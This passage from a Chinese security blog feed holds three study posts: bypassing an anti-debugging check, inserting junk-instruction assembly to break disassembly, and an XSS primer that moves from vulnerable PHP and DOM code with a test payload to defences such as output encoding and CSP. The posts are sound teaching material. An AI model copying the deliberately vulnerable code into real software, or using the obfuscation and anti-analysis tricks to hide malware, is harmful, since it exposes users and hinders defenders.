</p><p>由图可得对应的数据是1，接着程序就根据返回值是否是1来判断是否正在调试中，值为1就意味着正在被调试，值为0标志着正常运行。</p><p>那我们反反调试就十分简单了，将eax的值重新设定为0就可以成功绕过检测。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754ldsq2xj32ah0t0q9g.jpg" alt="img"> </p><p>随后继续正常运行，发现运行成功。成功反反调试。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754lhi20pj30ji09uq63.jpg" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令初步学习总结与简单实战</title>
      <link href="2019/09/16/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>2019/09/16/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>我们都知道，汇编语言是机器语言的符号化。反汇编的大致过程是：首先会确定指令開始的首地址，然后依据这个指令字推断是哪个汇编语句，随后再将后面的数据反汇编出来。在这里我们可以看到该过程存在纰漏，若有人有意的将错误的机器语言放在错误的位置，则在反汇编时有可能连同后面的数据一起错误地反汇编出来，这样，我们看到的就可能是一个错误的反汇编代码。</p><a id="more"></a><p>花指令是利用了反汇编时单纯依据机器指令字来决定反汇编结果的漏洞。它由设计者特别构思，使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。</p><p> 花指令是对反汇编的有用办法之一，正常代码添加了花指令之后，能够损坏静态反汇编的进程，使反汇编的成果呈现过错。过错的反汇编成果会形成破解者的剖析作业很多添加，进而使之不能了解程序的结构和算法，也就很难破解程序，然后到达病毒或软件维护的目的。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>总体上花指令分为两类，一类是可履行式花指令，另一类为不可履行式花指令（废物指令）。</p><p>对于可履行式花指令，望文生义就是能够正常运转的但又不改动原始程序逻辑性的一组无用指令。这类花指令有如下特色：</p><p>①能够正常运转；</p><p>②不改动任何寄存器的值；</p><p>③反汇编器能够正确反汇编该指令。</p><p>对于不可履行式花指令，是指被刺进到原始代码中但又不改动原始程序逻辑性的一组无用字节。这类花指令有如下特色：</p><p>①不行以正常运转；</p><p>②不改动任何寄存器的值；</p><p>③反汇编器或许会过错反汇编这些字节。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>正常代码添加了花指令后，能够干扰破坏正常静态反汇编的过程，增加了破解人员的分析难度，进而实现了保护软件的目的。</p><h3 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h3><p>我们还是以之前的helloworld小程序为例，在其中加入一段花指令进而干扰它的正常反汇编过程。</p><p>首先要注意的是，添加花指令这一过程需要一块比较大的0x00区域以便于我们进行修改。我们将原程序拉入OD之中，很容易可以找到一块可用的0x00空区域。如图我们随机选择以0041FFB1为开始的一大块空白区域。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754chjvexj30l208ydh8.jpg" alt="img"> </p><p>随后我们使界面回到打开OD载入软件时的入口地址，从下图我们可以得知该地址为00403510。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754gmzonzj30v40b80xo.jpg" alt="image-20190919205708184"> </p><p>我们在反汇编窗口点击右键——转到——表达式，然后输入之前选取的空白区域起始地址0041FFB1。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754cv3jrdj318p0u04br.jpg" alt="img"> </p><p>我们在转入的0041FFB1地址开始，一步一步输入花指令。我们在这里使用一段比较经典的花指令。</p><pre><code class="汇编">nopnopnopmov ebp,esppush -1push 111111push 222222mov eax,dword ptr fs:[0]push eaxmov dword ptr fs:[0],esppop eaxmov dword ptr fs:[0],eaxpop eaxpop eaxpop eaxpop eaxmov ebp,eaxmov eax,原入口地址push eaxretn</code></pre><p>注意在该程序中的“原入口地址”位置就是打开OD载入软件时的入口地址，00403510。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754czcxknj31c40u0dik.jpg" alt="img"> </p><p>随后在花指令的首行“0041FFB1”使用右键将此处设置为新EIP。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754firthjj30kk0hi78l.jpg"></p><p>最后继续在“0041FFB1”处右键，选择用OllyDump脱壳调试进程，并在弹出的选框中选择脱壳，并将该EXE文件保存。此时加花过程结束，我们双击发现运行正常。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
            <tag> 花指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨站脚本攻击（XSS）知识点</title>
      <link href="2019/08/25/XSS%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
      <url>2019/08/25/XSS%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><strong>概述</strong>：跨站点脚本（XSS）是Web应用程序中常见的一种安全漏洞。XSS使攻击者能够将客户端脚本注入其他用户查看的网页中。攻击者可以利用跨站点脚本漏洞绕过访问控制，如同源策略。在2007 年之前，赛门铁克（Symantec）报告的网站中所含XSS漏洞占据了所有安全漏洞的大约84％。直到现在，XSS仍然被认为是主要的威胁载体之一。XSS效果的范围从轻微的小麻烦到重大的安全风险，主要取决于受攻击站点对数据的敏感性设置以及站点管理者实施的安全防御措施。本文将主要就跨站脚本攻击（XSS）的概念、作用、过程，以及应用进行介绍。</p><a id="more"></a><h1 id="XSS的概念及作用"><a href="#XSS的概念及作用" class="headerlink" title="XSS的概念及作用"></a>XSS的概念及作用</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>XSS漏洞的起源可以追溯到1999年末的一个微软安全工程师小组，微软安全响应中心（The Microsoft Security Response Center）和微软浏览器安全团队（the Microsoft Internet Explorer Security Team）收到消息，一些网站受到攻击，脚本和图像标签被恶意注入html页面。并且该攻击本质上是持久的，payload被一次又一次地存储和注入，影响到所有请求该页面的人。后在2006至2013曾任PayPal首席信息安全官的Michael Barrett，反映了在美国运通网页中也发现了类似的问题，并在1999年秋季的一次会议上向微软安全中心团队描述了这个漏洞，12月20日，微软的安全工程师团队正式开始了对该漏洞的研究，并在新千年的二月份发布了一份报告，在本报告中，第一次定义了该种攻击的名称为Cross Site Scripting（XSS）。</p><p>大量的网站曾遭受XSS漏洞攻击或被发现此类漏洞，如Twitter，Facebook，MySpace，Orkut ,新浪微博和百度贴吧 。之后几年XSS已经超过<a href="file:////wiki/%25E7%25BC%2593%25E5%2586%25B2%25E5%258C%25BA%25E6%25BA%25A2%25E5%2587%25BA">缓冲区溢出</a>成为最流行的攻击方式，有68%的网站可能遭受此类攻击。根据开放网页应用安全计划（Open Web Application Security Project）公布的2010年统计数据，在Web安全威胁前10位中，XSS排名第2，仅次于代码注入（Injection）。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bn5wyli8j30v80p8qej.jpg" alt="image-20190825085720016"></p><center>Figure 1 Web安全攻击方式分布图</center>XSS漏洞，通常指的是恶意攻击者利用浏览器的动态展示数据功能，在Web页面里插入恶意脚本代码。当用户浏览该页之时，这些嵌入在HTML页面里面的问题代码会被执行，从而达到恶意的特殊目的。<p>XSS根据攻击效果的不同，基本可以分为以下几类：</p><ul><li><p>反射型XSS（Reflected XSS）：最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中，当受害者请求这样的链接时，跨站代码经过服务端反射回来。这类跨站代码通常不存储到服务端。</p></li><li><p>存储型XSS（Stored  XSS）：此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p></li><li><p>DOM型XSS（DOM-based XSS）：一种基于DOM的跨站，这是客户端脚本自身解析不正确导致的安全问题。</p></li></ul><h2 id="XSS的作用（危害）"><a href="#XSS的作用（危害）" class="headerlink" title="XSS的作用（危害）"></a>XSS的作用（危害）</h2><p>XSS的危害大小，其实主要取决于攻击者的js水平，这决定了攻击的效果。它对于攻击者的主要作用可以总结如下：</p><ul><li><p>  盗用cookie，获取敏感信息。</p></li><li><p>  利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</p></li><li><p>  利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p></li><li><p>  利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p></li><li><p>  在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现<a href="file:////wiki/DDoS">DDoS</a>攻击的效果。</p></li></ul><p>如果按照作用对象划分，还可以划为针对用户和针对Web服务两种大类，具体作用可看下图：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bncs2ff3j312s0hcdi8.jpg" alt="image-20190825090358128"></p><center>Figure 2 XSS的作用图</center>```php<?php // Is there any input? if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Feedback for end user    echo'<pre>Hello '. $_GET[ 'name' ] . '</pre>'; } ?>```<h1 id="常见XSS分析"><a href="#常见XSS分析" class="headerlink" title="常见XSS分析"></a>常见XSS分析</h1><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h2><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p><p>服务器端代码：</p><pre><code class="php">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;     // Feedback for end user     echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; &#125; ?&gt;</code></pre><p>可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。</p><h2 id="持久型-XSS"><a href="#持久型-XSS" class="headerlink" title="持久型 XSS"></a>持久型 XSS</h2><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p><p>服务器端代码：</p><pre><code class="php">&lt;?php  if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = mysql_real_escape_string( $message );    // Sanitize name input    $name = mysql_real_escape_string( $name );    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );    //mysql_close(); &#125;?&gt;</code></pre><p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p><p>HTML 代码：</p><pre><code class="html">&lt;html&gt;  &lt;head&gt;    &lt;title&gt;DOM-XSS test&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;script&gt;      var a=document.URL;        document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>将代码保存在 domXSS.html 中，浏览器访问：</p><p><a href="http://127.0.0.1/domXSS.html?a=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E">http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</a></p><p>即可触发 XSS 漏洞。</p><h1 id="几种XSS攻击方法"><a href="#几种XSS攻击方法" class="headerlink" title="几种XSS攻击方法"></a>几种XSS攻击方法</h1><h2 id="方法一-反射性XSS攻击流程"><a href="#方法一-反射性XSS攻击流程" class="headerlink" title="方法一 反射性XSS攻击流程"></a>方法一 反射性XSS攻击流程</h2><ol><li><p> 黑客向用户发送带有XSS恶意脚本的链接</p></li><li><p> 用户点击了恶意链接，访问了目标服务器。</p></li><li><p> 网站将XSS同正常页面返回到用户浏览器</p></li><li><p> 用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起了请求</p></li><li><p> 黑客从自己搭建的恶意服务器中获取用户提交的信息</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bno4dvj0j30w00osqa5.jpg" alt="image-20190825091452237"></p><center>Figure 3 反射性XSS攻击流程图</center>##  方法二 存储型XSS攻击流程<ol><li><p> 黑客在目标服务器上构造XSS恶意脚本，保存在数据库中</p></li><li><p> 用户在网站登录状态下访问了目标服务器，查看了存在恶意脚本的页面</p></li><li><p> 网站将XSS同正常页面返回到用户浏览器</p></li><li><p> 用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求</p></li><li><p> 黑客从自己搭建的恶意服务器中获取用户提交的信息</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bnoyd1g2j30wg0p046b.jpg" alt="image-20190825091540423"></p><center>Figure 4 存储型XSS攻击流程</center>##  方法三 DOM型XSS攻击流程<ol><li><p> 黑客构造出特殊的 URL，其中包含恶意代码。</p></li><li><p> 用户打开带有恶意代码的 URL。</p></li><li><p> 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</p></li><li><p> 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p></li></ol><h1 id="XSS防御方法"><a href="#XSS防御方法" class="headerlink" title="XSS防御方法"></a>XSS防御方法</h1><h2 id="防御方法一-前端输入检查"><a href="#防御方法一-前端输入检查" class="headerlink" title="防御方法一 前端输入检查"></a>防御方法一 前端输入检查</h2><p>DOM 型 XSS 攻击，归根结底就是网站前端 JavaScript 代码本身不够严谨，将不可信的数据当作代码执行了。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务资源。</p><p>前端在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>或<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location、onclick、onerror、onload、onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()、setTimeout()、setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><pre><code class="js">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;&lt;img onclick=&quot;UNTRUSTED&quot; onerror=&quot;UNTRUSTED&quot; src=&quot;data:image/png,&quot;&gt;&lt;!-- 链接内包含恶意代码 --&gt;&lt;a href=&quot;UNTRUSTED&quot;&gt;1&lt;/a&gt;&lt;script&gt;// setTimeout()/setInterval() 中调用恶意代码setTimeout(&quot;UNTRUSTED&quot;)setInterval(&quot;UNTRUSTED&quot;)// location 调用恶意代码location.href = &#39;UNTRUSTED&#39;// eval() 中调用恶意代码eval(&quot;UNTRUSTED&quot;)&lt;/script&gt;</code></pre><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p><h2 id="防御方法二-服务器端过滤（转义）"><a href="#防御方法二-服务器端过滤（转义）" class="headerlink" title="防御方法二 服务器端过滤（转义）"></a>防御方法二 服务器端过滤（转义）</h2><p>XSS的本质就是”恶意注入”，恶意的数据被当成了代码一部分来执行，从而混淆了原本的语义，产生了新的语义。</p><p>服务器端过滤指的是对部分输入的数据进行相应的编码转换，这样就会将输入解读为数据而不是XSS，阻碍了漏洞的执行。编码的转换主要包括HTML实体编码和JavaScript编码：</p><ol><li><p> HTMLEncode，就是将字符转换成HTMLEntities，一般会转（<code>&amp;、\&lt;、\&gt;、\&quot;、\&#39;、/</code>）这6个字符。</p></li><li><p> JavaScriptEncode，是使用”<code>\</code>“对特殊字符进行转义。除数字字母之外，小于127的字符编码使用16进制”<code>\xHH</code>“的方式进行编码，大于用unicode（非常严格模式）。</p></li></ol><p>但需要注意的是，并非所有的地方编转义都是有效可行的，总体上它确实可以起到一定的XSS防护作用，但是它并不完善。</p><table><thead><tr><th align="center"><strong>XSS安全漏洞所在语句</strong></th><th align="center"><strong>简单转义是否有防护效果</strong></th></tr></thead><tbody><tr><td align="center">HTML 标签文字内容</td><td align="center">有</td></tr><tr><td align="center">HTML 属性值</td><td align="center">有</td></tr><tr><td align="center">CSS 内联样式</td><td align="center">无</td></tr><tr><td align="center">内联JavaScript</td><td align="center">无</td></tr><tr><td align="center">内联JSON</td><td align="center">无</td></tr><tr><td align="center">跳转链接</td><td align="center">无</td></tr></tbody></table><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><p>例如在工程里，常用的转义库为 <code>org.owasp.encoder</code>。以下代码引用自 <a href="https://link.juejin.im/?target=https://www.owasp.org/index.php/OWASP_Java_Encoder_Project%23tab=Use_the_Java_Encoder_Project">org.owasp.encoder 的官方说明</a>。</p><pre><code class="html">&lt;!-- HTML 标签内文字内容 --&gt;&lt;div&gt;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&lt;/div&gt;&lt;!-- HTML 标签属性值 --&gt;&lt;input value=&quot;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&quot; /&gt;&lt;!-- CSS 属性值 --&gt;&lt;div style=&quot;width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;&quot;&gt;&lt;!-- CSS URL --&gt;&lt;div style=&quot;background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;&quot;&gt;&lt;!-- JavaScript 内联代码块 --&gt;&lt;script&gt;  var msg = &quot;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&quot;;  alert(msg);&lt;/script&gt;&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;&lt;script&gt;var __INITIAL_STATE__ = JSON.parse(&#39;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&#39;);&lt;/script&gt;&lt;!-- HTML 标签内联监听器 --&gt;&lt;button  onclick=&quot;alert(&#39;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#39;);&quot;&gt;  click me&lt;/button&gt;&lt;!-- URL 参数 --&gt;&lt;a href=&quot;/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top&quot;&gt;&lt;!-- URL 路径 --&gt;&lt;a href=&quot;/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&quot;&gt;&lt;!--  URL.  注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等--&gt;&lt;a href=&#39;&lt;%=  urlValidator.isValid(UNTRUSTED) ?    Encode.forHtml(UNTRUSTED) :    &quot;/404&quot;%&gt;&#39;&gt;  link&lt;/a&gt;</code></pre><p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。开发人员要注意在正确的地方使用正确的编码方式，有时为了防御XSS，在一个地方我们需要联合<code>HTMLEncode、JavaScriptEncode</code>进行编码，甚至是叠加，并不是固定一种方式编码。具体在哪种地方使用哪种编转义可以总结如下：</p><ol><li><p> <strong>在HTML标签、属性中输出</strong>——用HTMLEncode</p></li><li><p> <strong>在script标签中输出</strong>——用JavaScriptEncode</p></li><li><p> <strong>在事件中输出</strong>——用JavaScriptEncode</p></li></ol><blockquote><p>&lt;**<code>a** href=\&quot;\#\&quot; onclick=\&quot;funcA(\&#39;\$var\&#39;)\&quot;\&gt;test\&lt;/**a**\&gt;</code></p></blockquote><ol start="4"><li> <strong>在CSS中输出</strong></li></ol><p>用类似<code>JavaScriptEncode</code>的方式。将除了字母、数字外的所有字符都编码成十六进制形式”<code>\uHH</code>。</p><ol start="5"><li> <strong>在地址中输出</strong></li></ol><p>一般如果变量是整个URL，则先检查变量是否以”http”开头（不是则帮忙添加http），保证不会出现伪协议类的XSS攻击。然后再对变量进行URLEncode。（PS：URLEncode会将字符转换成”%HH”形式。）</p><p>第一、第二两种防御方法综合起来一句话就是：**<em>对输入进行过滤，对输出进行编码**</em>。</p><h2 id="防御方法三-CSP（Content-Security-Policy）"><a href="#防御方法三-CSP（Content-Security-Policy）" class="headerlink" title="防御方法三 CSP（Content Security Policy）"></a>防御方法三 CSP（Content Security Policy）</h2><p>与上面的两种防御方法相比，CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p><blockquote><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p></blockquote><ul><li><p>  禁止加载外域代码，防止复杂的攻击逻辑。</p></li><li><p>  禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</p></li><li><p>  禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</p></li><li><p>  禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</p></li><li><p>  合理使用上报可以及时发现 XSS，利于尽快修复问题。</p></li></ul><p>想要启用CSP主要可以使用两种方式，一种是通过网页的<code>\&lt;meta&gt;</code>标签。</p><pre><code class="html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</code></pre><p>在上面代码中，CSP 做了如下配置：</p><ul><li><p>  脚本：只信任当前域名</p></li><li><p>  &lt;object&gt;标签：不信任任何URL，即不加载任何资源</p></li><li><p>  样式表：只信任cdn.example.org和third-party.org</p></li><li><p>  框架（frame）：必须使用HTTPS协议加载</p></li><li><p>  其他资源：没有限制</p></li></ul><p>这样启用之后，不符合CSP的外部资源都会被阻止加载。</p><p>第二种方法，一些现代浏览器也支持通过响应头来定义 CSP。下面我们主要介绍如何通过响应头来使用 CSP：</p><p>CSP作为一种安全策略，浏览器对它响应头的兼容性也是随着版本的更迭逐渐扩大的，早期的 Chrome 是通过 X-WebKit-CSP 响应头来支持 CSP 的，而 firefox 和 IE 则支持 X-Content-Security-Policy，Chrome25 和 Firefox23 开始支持标准的 Content-Security-Policy。现有的主流浏览器不同版本号对于CSP响应头的兼容性如下图所示：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bo6s320zj31c40p4481.jpg" alt="image-20190825093247902"></p><p>要使用 CSP，只需要服务端输出类似这样的响应头就行了：</p><pre><code class="html">Content-Security-Policy: default-src &#39;self&#39;</code></pre><p>在这个响应头之中<code>default-src</code> 是 CSP 指令，多个指令之间用英文分号分割；<code>&#39;self&#39; </code>是指令值，多个指令值用英文空格分割。</p><p>目前，有这些 CSP 指令：</p><table><thead><tr><th align="center"><strong>指令</strong></th><th align="center"><strong>指令值示例</strong></th><th align="center"><strong>说明</strong></th></tr></thead><tbody><tr><td align="center">default-src</td><td align="center">‘self’ cnd.a.com</td><td align="center">定义针对所有类型（js、image、css、web font，ajax 请求，iframe，多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认的。</td></tr><tr><td align="center">script-src</td><td align="center">‘self’ js.a.com</td><td align="center">定义针对 JavaScript 的加载策略。</td></tr><tr><td align="center">style-src</td><td align="center">‘self’ css.a.com</td><td align="center">定义针对样式的加载策略。</td></tr><tr><td align="center">img-src</td><td align="center">‘self’ img.a.com</td><td align="center">定义针对图片的加载策略。</td></tr><tr><td align="center">connect-src</td><td align="center">‘self’</td><td align="center">针对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。</td></tr><tr><td align="center">font-src</td><td align="center">font.a.com</td><td align="center">针对 WebFont 的加载策略。</td></tr><tr><td align="center">object-src</td><td align="center">‘self’</td><td align="center">针对 <object>、<embed> 或 <applet> 等标签引入的 flash 等插件的加载策略。</td></tr><tr><td align="center">media-src</td><td align="center">media.a.com</td><td align="center">针对 <audio> 或 <video> 等标签引入的 HTML 多媒体的加载策略。</td></tr><tr><td align="center">frame-src</td><td align="center">‘self’</td><td align="center">针对 frame 的加载策略。</td></tr><tr><td align="center">sandbox</td><td align="center">allow-forms</td><td align="center">对请求的资源启用 sandbox（类似于 iframe 的 sandbox 属性）。</td></tr><tr><td align="center">report-uri</td><td align="center">/report-uri</td><td align="center">告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。</td></tr></tbody></table><p>指令值可以由下面这些内容组成：</p><table><thead><tr><th align="center"><strong>指令值</strong></th><th align="center"><strong>指令示例</strong></th><th align="center"><strong>说明</strong></th></tr></thead><tbody><tr><td align="center"></td><td align="center">img-src</td><td align="center">允许任何内容。</td></tr><tr><td align="center">‘none’</td><td align="center">img-src ‘none’</td><td align="center">不允许任何内容。</td></tr><tr><td align="center">‘self’</td><td align="center">img-src ‘self’</td><td align="center">允许来自相同来源的内容（相同的协议、域名和端口）。</td></tr><tr><td align="center">data:</td><td align="center">img-src data:</td><td align="center">允许 data: 协议（如 base64 编码的图片）。</td></tr><tr><td align="center"><a href="http://www.a.com/">www.a.com</a></td><td align="center">img-src img.a.com</td><td align="center">允许加载指定域名的资源。</td></tr><tr><td align="center"><em>.a.com</em></td><td align="center">img-src .a.com</td><td align="center">允许加载 a.com 任何子域的资源。</td></tr><tr><td align="center"><a href="https://img.com/">https://img.com</a></td><td align="center">img-src <a href="https://img.com/">https://img.com</a></td><td align="center">允许加载 img.com 的 https 资源（协议需匹配）。</td></tr><tr><td align="center">https:</td><td align="center">img-src https:</td><td align="center">允许加载 https 资源。</td></tr><tr><td align="center">‘unsafe-inline’</td><td align="center">script-src ‘unsafe-inline’</td><td align="center">允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。</td></tr><tr><td align="center">‘unsafe-eval’</td><td align="center">script-src ‘unsafe-eval’</td><td align="center">允许加载动态 js 代码，例如 eval()。</td></tr></tbody></table><p>从上面的介绍可以看到，CSP 协议可以控制的内容非常多。而且如果不特别指定 <code>&#39;unsafe-inline&#39;</code> 时，页面上所有 inline 样式和脚本都不会执行；不特别指定<code> &#39;unsafe-eval&#39;</code>，页面上不允许使用 new Function，setTimeout，eval 等方式执行动态代码。在限制了页面资源来源之后，被 XSS 的风险确实小不少。</p><h2 id="防御方法四-X-XSS-Protection"><a href="#防御方法四-X-XSS-Protection" class="headerlink" title="防御方法四 X-XSS-Protection"></a>防御方法四 X-XSS-Protection</h2><p>X-XSS-Protection 响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a>)时，浏览器将停止加载页面。虽然这些保护在现代浏览器中基本上是不必要的，当网站实施一个强大的CSP来禁用内联的JavaScript (<code>&#39;unsafe-inline&#39;</code>)时, 它仍然可以为尚不支持 <a href="https://developer.mozilla.org/en-US/docs/Glossary/CSP">CSP</a> 的旧版浏览器的用户提供保护。它的浏览器兼容性如下图：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bogms4f0j31800jgaf5.jpg" alt="image-20190825094216611"></p><p>它的使用语法如下所示：</p><blockquote><p>X-XSS-Protection: 0</p><p>X-XSS-Protection: 1</p><p>X-XSS-Protection: 1; mode=block</p><p>X-XSS-Protection: 1; report=&lt;**reporting-uri**&gt;</p><p><strong>0</strong></p><p>禁止XSS过滤。</p><p><strong>1</strong></p><p>启用XSS过滤（通常浏览器是默认的）。 